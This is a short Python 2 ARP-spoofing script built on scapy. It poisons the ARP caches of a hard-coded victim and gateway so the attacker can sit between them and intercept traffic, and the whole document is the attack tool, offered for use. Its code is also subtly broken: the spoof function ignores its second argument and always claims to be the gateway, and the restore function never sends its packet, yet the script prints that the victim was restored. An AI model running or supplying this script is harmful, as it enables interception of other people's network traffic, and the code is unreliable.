import scapy.all as scapy
from termcolor2 import c
from termcolor import colored
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc



def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)



target_ip = "192.168.178.28"
gateway_ip = "192.168.178.1"


sent_packets_count = 0
try:
    while True:
        #Telling the Router I'm the victim machine
        spoof(target_ip, gateway_ip)
        #Telling the victim machine I'm the router
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print colored("\r[+]", 'yellow'), colored("Number of spoof packages send >> "), colored(str(sent_packets_count), 'yellow'),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print colored("\n[!]",'red'), colored(" User pressed CTRL + C ... exiting program.")
    print colored("[!] Restored victim: ", 'green'), colored (str(target_ip), 'blue'), colored (" and router ", 'green'), colored (str(gateway_ip), 'blue')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
